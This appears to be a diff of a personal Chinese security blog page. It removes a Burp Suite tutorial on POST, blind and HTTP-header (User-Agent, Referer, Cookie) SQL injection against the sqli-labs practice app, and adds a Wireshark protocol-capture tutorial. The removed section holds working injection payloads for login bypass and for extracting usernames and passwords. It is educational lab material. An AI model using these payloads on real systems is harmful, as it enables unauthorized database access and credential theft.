@@ -6,23 +6,51 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://kur08a.github.io">
-  <title>使用BP进行POST型SQL注入 | Kur08a&#39;s Blog</title>
+  <title>使用WireShark对常用的6种协议抓包并分析 | Kur08a&#39;s Blog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="BP抓包，修改数据包探测注入点，结合提交的表单内容、cookie、UA、referer进行注入。">
+  <meta name="description" content="使用WireShark对ARP、ICMP、TCP、UDP、DNS、HTTP协议分别进行抓包并分析。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="使用BP进行POST型SQL注入">
-<meta property="og:url" content="https://kur08a.github.io/2022/03/27/%E4%BD%BF%E7%94%A8BP%E8%BF%9B%E8%A1%8CPOST%E5%9E%8BSQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="使用WireShark对常用的6种协议抓包并分析">
+<meta property="og:url" content="https://kur08a.github.io/2022/04/19/%E4%BD%BF%E7%94%A8WireShark%E5%AF%B9%E5%B8%B8%E7%94%A8%E7%9A%846%E7%A7%8D%E5%8D%8F%E8%AE%AE%E6%8A%93%E5%8C%85%E5%B9%B6%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="Kur08a&#39;s Blog">
-<meta property="og:description" content="BP抓包，修改数据包探测注入点，结合提交的表单内容、cookie、UA、referer进行注入。">
+<meta property="og:description" content="使用WireShark对ARP、ICMP、TCP、UDP、DNS、HTTP协议分别进行抓包并分析。">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-03-27T13:54:52.000Z">
-<meta property="article:modified_time" content="2022-03-27T14:01:22.088Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/1650348938899aa1b72c49d6840939eb0f3446e605d44.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/1650348966900324168e1da6aa54706b04457b9134323.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351032256bbc0d44f2b1635b45d4cb3c868820bf6.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351084239d0290216ea1c06f417ce3bf298554172.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351120245dafda07ab99712267636c73d850ae414.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351155242a87e6ec1d57ff0aeebf257b2a6ace5a5.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351163234893621791db34a537e8356cb318d65e7.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351167232076e2ca4beeadcf108681db8fc474d3b.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351233232dee54d4755c699bc8667241f471ccbbc.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/16503512392320773259e945e591e0fea1a5be9909b28.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/16503512462348bfc8d3a3e4b592a6b505e4088b76e28.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351253232de2b5521609551561ae8864ce8f5a156.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351259237a79594231b6c3f20aaebe491065fa39e.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/165035126824069164fee02fb310f6bf06ab2a3519630.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351275240500482af4904826dea251d95335bc926.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351512237785dd3c60c271bfc9c05c0f92c9e9408.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351516235c2f85c94d92fe0ee95881b18c7b7c71f.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/16503515222327de8d17267cc28269ba5516b8967d35c.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/16503515262337fef44d4e7dc864e07b704681c931e01.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351671232d2927d2f4df5733308c81538e86f439e.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/16503516742326bfc408621a4fa3d45d9613f81fad725.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351677233da7652a916f35339b9efc9b99f9edf2e.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351738232486d9b85f4ffeba5a05543b7c2e7fe58.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351741233676dda32dbb381eff76e86fcf47b7fed.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/16503517442339ddeb1a3894bca16ae9e7d756d357132.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650352105933ea2235845f605a4e1135aeef372f8bc6.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/16503521109310b7029d9be909f5e20d34e453df93797.png">
+<meta property="article:published_time" content="2022-04-19T06:45:40.000Z">
+<meta property="article:modified_time" content="2022-04-19T07:09:06.050Z">
 <meta property="article:author" content="kur08a">
 <meta property="article:tag" content="penetration">
 <meta property="article:tag" content="Web vulnerability">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/1650348938899aa1b72c49d6840939eb0f3446e605d44.png">
   
     <link rel="alternative" href="/atom.xml" title="Kur08a&#39;s Blog" type="application/atom+xml">
   
@@ -193,14 +221,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-使用BP进行POST型SQL注入" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-使用WireShark对常用的6种协议抓包并分析" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      使用BP进行POST型SQL注入
+      使用WireShark对常用的6种协议抓包并分析
     </h1>
   
 
@@ -213,8 +241,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2022/03/27/%E4%BD%BF%E7%94%A8BP%E8%BF%9B%E8%A1%8CPOST%E5%9E%8BSQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-        <time datetime="2022-03-27T13:54:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-27</time>
+<a href="/2022/04/19/%E4%BD%BF%E7%94%A8WireShark%E5%AF%B9%E5%B8%B8%E7%94%A8%E7%9A%846%E7%A7%8D%E5%8D%8F%E8%AE%AE%E6%8A%93%E5%8C%85%E5%B9%B6%E5%88%86%E6%9E%90/" class="archive-article-date">
+        <time datetime="2022-04-19T06:45:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-19</time>
 </a>
 
   
@@ -227,7 +255,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">792字</span>
+      <span class="post-count">587字</span>
     </span>
   </span>
 
@@ -236,7 +264,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">3分</span>
+      <span class="post-count">2分</span>
     </span>
   </span>
 </div>
@@ -247,23 +275,71 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <p>BP抓包，修改数据包探测注入点，结合提交的表单内容、cookie、UA、referer进行注入。<span id="more"></span></p>
-<p>常见错误：</p>
-<p>Burpsuite 打开了，代理截获功能也开启了，并监听 127.0.0.1 的 8080 端口，浏览器中也设置了代理为 127.0.0.1 的 8080 端口，但是在浏览器中 <a target="_blank" rel="noopener" href="http://192.168.1.63/sqli-labs/">http://192.168.1.63/sqli-labs/</a> 页面可以正常打开。</p>
-<p>原因：</p>
-<p>浏览缓存所造成，由于浏览直接使用缓存的数据，并没向服务器发起请求，所以 Burpsuite并没有截获其请求。</p>
-<p>解决：</p>
-<p>1、可以再次刷新，或按 Ctrl+F5（强制刷新，不走本地缓存）</p>
-<p>2、清除浏览器的缓存</p>
-<h3 id="1、POST方式注入："><a href="#1、POST方式注入：" class="headerlink" title="1、POST方式注入："></a>1、POST方式注入：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1、开启截断抓包，Ctrl+R发送到Repeater中继器。</span><br><span class="line"></span><br><span class="line">2、判断是否存在注入点（加 \ ）：</span><br><span class="line">uname=admin&amp;passwd=123456\&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">3、可以使用单引号字符注入来构造一个万能密码：</span><br><span class="line">uname=admin&amp;passwd=123456&#x27;or 1=1 --+&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">4、爆出数据库名：</span><br><span class="line">uname=admin&#x27; and extractvalue(1,concat(0x7e,(select database()))) --+</span><br><span class="line">&amp;passwd=123456&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">5、爆表：</span><br><span class="line">uname=admin&#x27; and extractvalue(2,concat(&#x27;|&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 3,1),&#x27;|&#x27;))--+&amp;passwd=123456&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">6、爆字段：</span><br><span class="line">uname=admin&#x27; and extractvalue(2,concat(&#x27;|&#x27;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 2,1),&#x27;|&#x27;))--+&amp;passwd=123456&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">7、爆数据：</span><br><span class="line">uname=admin&#x27; and extractvalue(2,concat(&#x27;|&#x27;,(select concat(username,&#x27;|&#x27;,password) from users limit 1,1),&#x27;|&#x27;))--+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>
-
-<h3 id="2、POST-方式的布尔型盲注"><a href="#2、POST-方式的布尔型盲注" class="headerlink" title="2、POST 方式的布尔型盲注"></a>2、POST 方式的布尔型盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and (length(database())=8)--+&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
-
-<h3 id="3、POST-方式的时间盲注"><a href="#3、POST-方式的时间盲注" class="headerlink" title="3、POST 方式的时间盲注"></a>3、POST 方式的时间盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and (select if(length(database())&gt;1,sleep(3),null))--+&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
-
-<h3 id="4、HTTP-头的注入方式"><a href="#4、HTTP-头的注入方式" class="headerlink" title="4、HTTP 头的注入方式"></a>4、HTTP 头的注入方式</h3><p>HTTP 头注入原理:</p>
-<p>HTTP 头中的参数被带入数据库中被执行就造成了 HTTP 头注入。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1、HTTP User-Agent 注入：</span><br><span class="line"></span><br><span class="line">a. 判断注入点：</span><br><span class="line">修改 User-Agent 字段添加一个 &#x27; 单引号</span><br><span class="line">b. 注入测试：</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0&#x27; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) or &#x27;1&#x27;=&#x27;1</span><br><span class="line">或</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2、HTTP Referer 注入：</span><br><span class="line"></span><br><span class="line">a. 使用单引号测试是否存在注入。</span><br><span class="line">b. 报错注入:</span><br><span class="line">Referer: http://192.168.1.63/sqli-labs/Less-19/&#x27; and </span><br><span class="line">updatexml(1,concat(0x7e,(database()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br><span class="line">c. 盲注测试:</span><br><span class="line">Referer: http://192.168.1.63/sqli-labs/Less-19/&#x27; or (length(database())) =9 or if(1=1, sleep(3), null) or &#x27;1&#x27; = &#x27;1</span><br><span class="line">#语句中三个条件都为逻辑或</span><br><span class="line">当第一个条件不成功时，再执行第二个条件，第二个条也不成功时，则执行第三个。</span><br><span class="line">其中有一个条件执行成功时，则不会向后继续执行。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3、Cookie 注入：</span><br><span class="line"></span><br><span class="line">需要抓取包含 Cookie 信息的 HTTP，没抓到就放行，放着放着就有了。</span><br><span class="line">抓到带有 cookie 的请求包，Cookie：uname=admin，而后使用Ctrl+R 发送到 Repeater</span><br><span class="line">a. 使用Cookie: uname=admin&#x27; or &#x27;1&#x27;=&#x27;1 判断注入点。</span><br><span class="line">b. 使用 updatexml 报错注入获取数据库名称：</span><br><span class="line">Cookie: uname=admin&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+    <p>使用WireShark对ARP、ICMP、TCP、UDP、DNS、HTTP协议分别进行抓包并分析。<span id="more"></span></p>
+<h3 id="1、ARP协议："><a href="#1、ARP协议：" class="headerlink" title="1、ARP协议："></a>1、ARP协议：</h3><p>使用 nmap 来基于 ARP 协议进行扫描：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/1650348938899aa1b72c49d6840939eb0f3446e605d44.png"></p>
+<p>抓包：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/1650348966900324168e1da6aa54706b04457b9134323.png"></p>
+<p>分析：</p>
+<p>请求包：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351032256bbc0d44f2b1635b45d4cb3c868820bf6.png"></p>
+<p>应答包：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351084239d0290216ea1c06f417ce3bf298554172.png"></p>
+<p>可以看到应答包补全了自己的MAC地址，目的地址和源地址做了交换。</p>
+<h3 id="2、ICMP协议："><a href="#2、ICMP协议：" class="headerlink" title="2、ICMP协议："></a>2、ICMP协议：</h3><p>ping命令是基于ICMP协议的，基于ping命令进行扫描：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351120245dafda07ab99712267636c73d850ae414.png"></p>
+<p>抓包：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351155242a87e6ec1d57ff0aeebf257b2a6ace5a5.png"></p>
+<p>分析：</p>
+<p>请求包：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351163234893621791db34a537e8356cb318d65e7.png"></p>
+<p>应答包：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351167232076e2ca4beeadcf108681db8fc474d3b.png"></p>
+<p>工作过程：</p>
+<p>本机发送一个 ICMP Echo Request 的包。</p>
+<p>接收方返回一个 ICMP Echo Reply，包含了接受到数据拷贝和一些其他指令。</p>
+<h3 id="3、TCP协议："><a href="#3、TCP协议：" class="headerlink" title="3、TCP协议："></a>3、TCP协议：</h3><p><strong>（1）通过Xshell远程连接 Kali Linux 捕获完整的TCP 3次握手的数据包：</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351233232dee54d4755c699bc8667241f471ccbbc.png"></p>
+<p>抓包：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/16503512392320773259e945e591e0fea1a5be9909b28.png"></p>
+<p>分析：</p>
+<p>第一个SYN包(序列号Seq和告知收悉号ACK都是 0)：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/16503512462348bfc8d3a3e4b592a6b505e4088b76e28.png"></p>
+<p>第二个SYN&#x2F;ACK包(Seq&#x3D;0,Ack&#x3D;1)：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351253232de2b5521609551561ae8864ce8f5a156.png"></p>
+<p>第三个ACK包(Seq&#x3D;1,Ack&#x3D;1)：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351259237a79594231b6c3f20aaebe491065fa39e.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/165035126824069164fee02fb310f6bf06ab2a3519630.png"></p>
+<p>第一个包中seq&#x3D;x,第二个包中的ack&#x3D;x+1,seq&#x3D;y，第三个包中的ack&#x3D;y+1。</p>
+<p>点击流量图查看：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351275240500482af4904826dea251d95335bc926.png"></p>
+<p><strong>（2）在Xshell中输入exit断开连接，以此来抓取TCP协议的四次挥手过程：</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351512237785dd3c60c271bfc9c05c0f92c9e9408.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351516235c2f85c94d92fe0ee95881b18c7b7c71f.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/16503515222327de8d17267cc28269ba5516b8967d35c.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/16503515262337fef44d4e7dc864e07b704681c931e01.png"></p>
+<h3 id="4、UDP协议："><a href="#4、UDP协议：" class="headerlink" title="4、UDP协议："></a>4、UDP协议：</h3><p>nmap基于UDP连接的端口扫描：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351671232d2927d2f4df5733308c81538e86f439e.png"></p>
+<p>抓包：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/16503516742326bfc408621a4fa3d45d9613f81fad725.png"></p>
+<p>UDP无需连接，所以较TCP简单，没有Seq和Ack号，省去了建立连接的过程，UDP协议头中，只有端口号、包长度和校验码等少量信息。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351677233da7652a916f35339b9efc9b99f9edf2e.png"></p>
+<h3 id="5、DNS协议："><a href="#5、DNS协议：" class="headerlink" title="5、DNS协议："></a>5、DNS协议：</h3><p>DNS也是UDP的上层协议，可以直接用UDP筛选：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351738232486d9b85f4ffeba5a05543b7c2e7fe58.png"></p>
+<p>就这么简单的两行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650351741233676dda32dbb381eff76e86fcf47b7fed.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/16503517442339ddeb1a3894bca16ae9e7d756d357132.png"></p>
+<h3 id="6、HTTP协议："><a href="#6、HTTP协议：" class="headerlink" title="6、HTTP协议："></a>6、HTTP协议：</h3><p>curl 是一个在命令行下工作的文件传输工具，可用来发送 http 请求。</p>
+<p>-I 大写的 i 表示仅返回头部信息。</p>
+<p>发送请求：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/1650352105933ea2235845f605a4e1135aeef372f8bc6.png"></p>
+<p>抓包分析：</p>
+<p>因为HTTP是TCP的上层协议，所以过滤TCP的数据会包含HTTP协议的数据包：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kur08a/picture@main/images/20220419/16503521109310b7029d9be909f5e20d34e453df93797.png"></p>
+<p>第一步：我们我们发送了一个 HTTP 的 HEAD 请求；</p>
+<p>第二步：服务器收到我们的请求返回了一个 Seq&#x2F;ACK 进行确认；</p>
+<p>第三步：服务器将 HTTP 的头部信息返回给我们客户端，状态码为200，表示页面正常；</p>
+<p>第四步：客户端收到服务器返回的头部信息向服务器发送Seq&#x2F;ACK进行确认，发送完成之后客户端就会发送 FIN&#x2F;ACK 来进行关闭链接的请求。</p>
 
     
 
@@ -278,7 +354,7 @@
    
    <br>
    <strong>本文链接：</strong>
-   <a rel="license" href="https://kur08a.github.io/2022/03/27/%E4%BD%BF%E7%94%A8BP%E8%BF%9B%E8%A1%8CPOST%E5%9E%8BSQL%E6%B3%A8%E5%85%A5/">https://kur08a.github.io/2022/03/27/%E4%BD%BF%E7%94%A8BP%E8%BF%9B%E8%A1%8CPOST%E5%9E%8BSQL%E6%B3%A8%E5%85%A5/</a>
+   <a rel="license" href="https://kur08a.github.io/2022/04/19/%E4%BD%BF%E7%94%A8WireShark%E5%AF%B9%E5%B8%B8%E7%94%A8%E7%9A%846%E7%A7%8D%E5%8D%8F%E8%AE%AE%E6%8A%93%E5%8C%85%E5%B9%B6%E5%88%86%E6%9E%90/">https://kur08a.github.io/2022/04/19/%E4%BD%BF%E7%94%A8WireShark%E5%AF%B9%E5%B8%B8%E7%94%A8%E7%9A%846%E7%A7%8D%E5%8D%8F%E8%AE%AE%E6%8A%93%E5%8C%85%E5%B9%B6%E5%88%86%E6%9E%90/</a>
    <br>
    <strong>版权声明：</strong>
    本作品采用
@@ -396,7 +472,7 @@
   <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
   <p>扫一扫，分享到微信</p>
   <div class="wx-qrcode">
-    <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kur08a.github.io/2022/03/27/%E4%BD%BF%E7%94%A8BP%E8%BF%9B%E8%A1%8CPOST%E5%9E%8BSQL%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
+    <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kur08a.github.io/2022/04/19/%E4%BD%BF%E7%94%A8WireShark%E5%AF%B9%E5%B8%B8%E7%94%A8%E7%9A%846%E7%A7%8D%E5%8D%8F%E8%AE%AE%E6%8A%93%E5%8C%85%E5%B9%B6%E5%88%86%E6%9E%90/" alt="微信分享二维码">
   </div>
 </div>
 
@@ -411,18 +487,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2022/03/28/English-unit1-phrase/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          English-unit1-phrase
-        
-      </div>
-    </a>
   
-  
-    <a href="/2022/03/27/SQLI%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E8%A1%A5%E5%85%85-%E6%8A%A5%E9%94%99%E4%B8%89%E5%87%BD%E6%95%B0/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">SQLI报错注入补充-报错三函数</div>
+    <a href="/2022/04/19/%E4%BD%BF%E7%94%A8-nmap-%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">使用 nmap 进行信息收集</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -449,7 +516,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81POST%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">1、POST方式注入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81POST-%E6%96%B9%E5%BC%8F%E7%9A%84%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.</span> <span class="toc-text">2、POST 方式的布尔型盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81POST-%E6%96%B9%E5%BC%8F%E7%9A%84%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">3、POST 方式的时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81HTTP-%E5%A4%B4%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">4、HTTP 头的注入方式</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81ARP%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">1、ARP协议：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81ICMP%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">2、ICMP协议：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81TCP%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">3、TCP协议：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81UDP%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">4、UDP协议：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81DNS%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">5、DNS协议：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81HTTP%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">6、HTTP协议：</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -487,7 +554,7 @@ if(true){
   	repo: 'myhexocomments',
   	owner: 'kur08a',
   	admin: ['kur08a'],
-  	id: 'Sun Mar 27 2022 21:54:52 GMT+0800',
+  	id: 'Tue Apr 19 2022 14:45:40 GMT+0800',
   	distractionFreeMode: 'true'
 })
 gitalk.render('gitalk-container') 
